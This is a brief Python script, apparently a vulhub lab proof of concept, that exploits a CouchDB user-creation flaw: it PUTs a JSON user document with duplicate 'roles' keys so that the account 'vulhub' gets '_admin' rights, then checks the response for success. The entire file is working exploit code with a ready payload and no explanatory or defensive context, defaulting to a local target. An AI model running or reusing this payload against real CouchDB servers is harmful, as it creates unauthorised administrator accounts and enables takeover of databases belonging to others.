import requests

'''
http://your-ip:5984/_utils/ vulhub vulhub
'''

PAYLOAD = '''{
  "type": "user",
  "name": "vulhub",
  "roles": ["_admin"],
  "roles": [],
  "password": "vulhub"
}
'''


def run(url, timeout=5):
    try:
        r = requests.put(url + '/_users/org.couchdb.user:vulhub',
                         data=PAYLOAD, timeout=timeout, verify=False)
        if "ok" in r.content or 'Document update conflict.' in r.content:
            return True
    except Exception as e:
        print e
        pass


if __name__ == '__main__':
        print run('http://127.0.0.1:5984')
